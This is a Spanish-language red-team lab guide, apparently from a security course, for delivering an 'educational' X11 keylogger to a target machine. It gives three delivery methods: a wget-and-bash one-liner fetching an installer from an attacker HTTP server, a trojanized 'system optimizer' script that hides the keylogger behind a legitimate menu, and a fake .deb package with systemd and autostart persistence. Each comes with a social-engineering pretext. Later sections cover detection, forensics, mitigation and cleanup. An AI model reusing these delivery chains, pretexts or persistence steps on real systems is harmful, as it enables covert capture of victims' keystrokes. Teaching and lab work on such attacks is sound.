# Guía Completa: Entrega de Payload - Keylogger Educativo X11

## 📋 Índice

1. [Preparación del Entorno](#preparación)
2. [Método 1: Servidor HTTP de Descarga](#método-1)
3. [Método 2: Script Troyanizado](#método-2)
4. [Método 3: Paquete DEB Falso](#método-3)
5. [Detección y Forense](#detección)
6. [Documentación para Reporte](#documentación)

---

## 🔧 Preparación del Entorno {#preparación}

### En Red Team (Atacante)

```bash
# 1. Ubicarse en el directorio del proyecto
cd ~/KeyloggerEducativoParaLinuxX11

# 2. Compilar el keylogger
make clean && make

# 3. Verificar compilación
ls -lh x11_keylogger
file x11_keylogger

# 4. Obtener IP del atacante
ip addr show | grep 'inet ' | grep -v '127.0.0.1'
```

### En Target (Objetivo - Blue Team)

```bash
# Verificar que X11 esté activo (NO Wayland)
echo $XDG_SESSION_TYPE  # Debe mostrar 'x11'
echo $DISPLAY           # Debe mostrar algo como ':0' o ':1'

# Verificar librerías necesarias
dpkg -l | grep -E "libx11-6|libxtst6"
```

---

## 📥 Método 1: Servidor HTTP de Descarga {#método-1}

### Ventajas
- Simple y rápido
- Fácil de documentar
- Simula descarga desde sitio comprometido

### Implementación Paso a Paso

#### Paso 1.1: Preparar Servidor (Red Team)

```bash
# Ejecutar el script de delivery server
chmod +x delivery_server.sh
./delivery_server.sh
```

El script creará:
- `delivery_payload/x11_keylogger` - Binario
- `delivery_payload/install_system_monitor.sh` - Script instalador
- `delivery_payload/README.txt` - Documentación falsa
- Servidor HTTP en puerto 8080

#### Paso 1.2: Simular Descarga (Target)

**Escenario de Ingeniería Social:**
"Hemos desarrollado una herramienta de monitoreo de sistema. Descárguela desde: http://[IP]:8080"

```bash
# En el sistema objetivo (con conocimiento del Blue Team)
cd /tmp

# Opción A: Descarga y ejecución automática
wget http://192.168.1.100:8080/install_system_monitor.sh && bash install_system_monitor.sh

# Opción B: Descarga manual e inspección
wget http://192.168.1.100:8080/install_system_monitor.sh
cat install_system_monitor.sh  # Blue Team puede inspeccionar aquí
chmod +x install_system_monitor.sh
./install_system_monitor.sh
```

#### Paso 1.3: Verificación Post-Entrega (Red Team)

```bash
# Verificar logs del servidor HTTP
# Ver qué archivos fueron descargados y cuándo

# En el objetivo, verificar ejecución
ssh usuario@target "ps aux | grep system-monitor"
ssh usuario@target "ls -la ~/.local/bin/"
```

### Capturas Requeridas para Reporte

1. **`screenshot_delivery_server_[TS].png`**
   - Servidor HTTP activo mostrando archivos disponibles
   
2. **`screenshot_wget_download_[TS].png`**
   - Comando wget en el target descargando el payload
   
3. **`screenshot_installation_[TS].png`**
   - Ejecución del script de instalación

---

## 🎭 Método 2: Script Troyanizado {#método-2}

### Ventajas
- Más sofisticado
- Combina funcionalidad legítima + maliciosa
- Demuestra técnica de "cavalo de Troya"

### Implementación Paso a Paso

#### Paso 2.1: Personalizar el Script (Red Team)

```bash
# Editar system_optimizer.sh
# Cambiar la línea 141 con tu IP:
ATTACKER_SERVER="http://TU_IP_AQUI:8080"

# Hacer ejecutable
chmod +x system_optimizer.sh

# Opcional: Ofuscar el script (básico)
# Para demostraciones educativas, NO es necesario
```

#### Paso 2.2: Entregar el Script (Social Engineering)

**Escenario:**
"Hemos detectado problemas de rendimiento en su sistema. Use este script de optimización para resolverlos."

```bash
# Transferir via SCP
scp system_optimizer.sh usuario@target:/tmp/

# O via servidor HTTP
# (incluir system_optimizer.sh en delivery_payload/)
```

#### Paso 2.3: Ejecución en Target

```bash
# En el sistema objetivo
cd /tmp
chmod +x system_optimizer.sh
./system_optimizer.sh

# El usuario verá un menú legítimo
# Seleccionar opción 5 (Optimización completa)
# Esto ejecutará funciones reales + el keylogger
```

#### Paso 2.4: Análisis Forense (Blue Team)

```bash
# Inspeccionar el script
cat system_optimizer.sh | grep -A 10 "deploy_monitoring_agent"

# Buscar procesos sospechosos
ps aux | grep monitor
ls -la ~/.config/system-monitor/

# Verificar autostart
cat ~/.config/autostart/system-monitor.desktop
```

### Capturas Requeridas

4. **`screenshot_trojan_menu_[TS].png`**
   - Menú del script mostrando opciones "legítimas"
   
5. **`screenshot_forensic_analysis_[TS].png`**
   - Análisis del código mostrando la función maliciosa

---

## 📦 Método 3: Paquete DEB Falso {#método-3}

### Ventajas
- Apariencia muy legítima
- Utiliza mecanismo de instalación del sistema
- Demuestra persistencia via servicios

### Implementación Paso a Paso

#### Paso 3.1: Crear el Paquete (Red Team)

```bash
# Ejecutar el generador
chmod +x create_malicious_deb.sh
./create_malicious_deb.sh

# Resultado: system-monitor_1.0.0.deb
ls -lh system-monitor_1.0.0.deb
```

#### Paso 3.2: Transferir e Instalar (Target)

```bash
# Transferir el .deb
scp system-monitor_1.0.0.deb usuario@target:/tmp/

# En el target
cd /tmp
sudo dpkg -i system-monitor_1.0.0.deb

# Resolver dependencias si es necesario
sudo apt-get install -f
```

#### Paso 3.3: Ejecutar y Verificar

```bash
# Ejecutar el "monitor"
system-monitor
# O
sysmon

# Verificar instalación
dpkg -l | grep system-monitor
which system-monitor
```

#### Paso 3.4: Análisis de Persistencia (Blue Team)

```bash
# Ver archivos instalados
dpkg -L system-monitor

# Inspeccionar servicio systemd
cat /etc/systemd/system/system-monitor.service

# Ver scripts de instalación
cat /var/lib/dpkg/info/system-monitor.postinst
```

### Capturas Requeridas

6. **`screenshot_deb_creation_[TS].png`**
   - Proceso de creación del paquete .deb
   
7. **`screenshot_dpkg_install_[TS].png`**
   - Instalación del paquete en el target
   
8. **`screenshot_dpkg_files_[TS].png`**
   - Archivos instalados por el paquete

---

## 🔍 Detección y Análisis Forense {#detección}

### Indicadores de Compromiso (IOCs)

#### A. Nivel de Proceso

```bash
# Buscar procesos sospechosos
ps aux | grep -E "keylog|monitor|x11"

# Ver conexiones de red (si el keylogger exfiltra)
netstat -tulpn | grep -E "8080|4444"

# Procesos con conexiones X11 activas
lsof | grep X11
```

#### B. Nivel de Sistema de Archivos

```bash
# Archivos recientes en /tmp
ls -lat /tmp | head -20

# Archivos ocultos en home
ls -laR ~ | grep "^\."

# Buscar binarios sospechosos
find /home -type f -executable -name "*monitor*" 2>/dev/null
find /home -type f -name "keylog*" 2>/dev/null
```

#### C. Nivel de Autostart/Persistencia

```bash
# Ver autostart del usuario
ls -la ~/.config/autostart/
cat ~/.config/autostart/*.desktop

# Servicios systemd de usuario
systemctl --user list-units --type=service

# Cron jobs
crontab -l
```

#### D. Nivel de Red (si hay exfiltración)

```bash
# Monitorear tráfico saliente
sudo tcpdump -i any -n dst port 80 or dst port 443

# Verificar conexiones establecidas
ss -tunap | grep ESTAB
```

### Timeline Forense

```bash
# Crear timeline de actividad
find /home -type f -printf '%T+ %p\n' | sort | tail -50

# Logs del sistema
journalctl --since "1 hour ago" | grep -E "keylog|monitor"

# Últimos comandos ejecutados (si existe history)
history | tail -30
```

---

## 📝 Documentación para Reporte {#documentación}

### Sección: Fase 3 - Explotación

#### 3.1 Vector de Entrega Utilizado

**Método:** [Servidor HTTP / Script Troyanizado / Paquete DEB]

**Justificación:** 
[Explicar por qué elegiste este método específico]

**Contexto de Ingeniería Social:**
```
[Describir el pretexto usado]
Ejemplo: "Se informó al usuario que su sistema requería 
actualización del software de monitoreo debido a una 
vulnerabilidad crítica detectada."
```

#### 3.2 Comandos Ejecutados

**En Red Team:**
```bash
# [Listar comandos exactos con timestamps]
[2024-12-19 14:30:00] ./delivery_server.sh
[2024-12-19 14:30:15] python3 -m http.server 8080
```

**En Target:**
```bash
# [Listar comandos ejecutados en el objetivo]
[2024-12-19 14:31:00] wget http://192.168.1.100:8080/install.sh
[2024-12-19 14:31:15] bash install.sh
```

#### 3.3 Evidencias de Ejecución

**Capturas obligatorias:**
- Servidor activo con archivos disponibles
- Descarga del payload en el target
- Ejecución e instalación
- Proceso del keylogger en ejecución
- Archivo keylog.txt con contenido

**Hashes de Archivos:**
```bash
sha256sum x11_keylogger
sha256sum system-monitor_1.0.0.deb  # Si aplica
```

#### 3.4 Análisis de Impacto

| Aspecto | Descripción |
|---------|-------------|
| **Acceso obtenido** | Usuario regular, sin privilegios root |
| **Persistencia** | [Sí/No] - [Método: autostart/systemd/ninguno] |
| **Datos capturados** | Pulsaciones de teclado, ventanas activas |
| **Exfiltración** | [Sí/No] - [Método si aplica] |
| **Detección** | [Fácil/Media/Difícil] - [Justificar] |

---

## 🛡️ Recomendaciones de Mitigación

### Para Blue Team

1. **Detección Inmediata:**
   ```bash
   # Monitorear procesos con conexiones X11
   watch -n 2 "ps aux | grep -E 'X11|keylog|record'"
   
   # Alertas de archivos nuevos en directorios críticos
   inotifywait -m -r -e create /home /tmp
   ```

2. **Prevención:**
   - Migrar a Wayland (elimina vulnerabilidad de raíz)
   - Deshabilitar XRecord si no es necesario
   - Implementar AppArmor/SELinux
   - Educar usuarios sobre ingeniería social

3. **Respuesta a Incidentes:**
   ```bash
   # Detener todos los procesos sospechosos
   pkill -f keylog
   pkill -f monitor
   
   # Desinstalar paquetes maliciosos
   sudo dpkg -r system-monitor
   
   # Eliminar persistencia
   rm -f ~/.config/autostart/system-monitor.desktop
   ```

---

## 🎯 Checklist para el Reporte

- [ ] Método de entrega documentado con justificación
- [ ] Comandos exactos con timestamps
- [ ] Capturas de pantalla con pies descriptivos
- [ ] Hashes SHA256 de todos los payloads
- [ ] Análisis forense de archivos instalados
- [ ] Timeline de la explotación
- [ ] IOCs (Indicators of Compromise) identificados
- [ ] Recomendaciones específicas de mitigación
- [ ] Evidencia de limpieza post-práctica

---

## 📌 Notas Finales

### Consideraciones Éticas

- ✅ **SÍ:** Usar en laboratorios propios con consentimiento explícito
- ✅ **SÍ:** Documentar para reportes académicos/profesionales
- ✅ **SÍ:** Limpiar el entorno después de la práctica

- ❌ **NO:** Usar en sistemas de terceros sin autorización
- ❌ **NO:** Dejar persistencia activa después de la práctica
- ❌ **NO:** Compartir payloads fuera del contexto educativo

### Limpieza Post-Práctica

```bash
# En el target
pkill -f x11_keylogger
pkill -f system-monitor
rm -rf ~/.local/bin/system-monitor
rm -rf ~/.config/system-monitor
rm -f ~/.config/autostart/system-monitor.desktop
sudo dpkg -r system-monitor 2>/dev/null || true

# Verificar que todo esté limpio
ps aux | grep -E "keylog|monitor"
find /home -name "*keylog*" -o -name "*monitor*" 2>/dev/null
```

---

## 📚 Referencias

- [README.md principal del proyecto](../README.md)
- [Documentación de seguridad](../SEGURIDAD.md)
- [Plantilla de reporte Red Team](../Reporte-RedTeam-Template.md)
- [X11 Security - ArchWiki](https://wiki.archlinux.org/title/Xorg#Security)
- [Wayland vs X11 Security](https://wayland.freedesktop.org/docs/html/ch04.html)

---

**Versión:** 1.0  
**Última actualización:** 2024-12-19  
**Autores:** [Tu Nombre] - Práctica de Auditoría de Seguridad
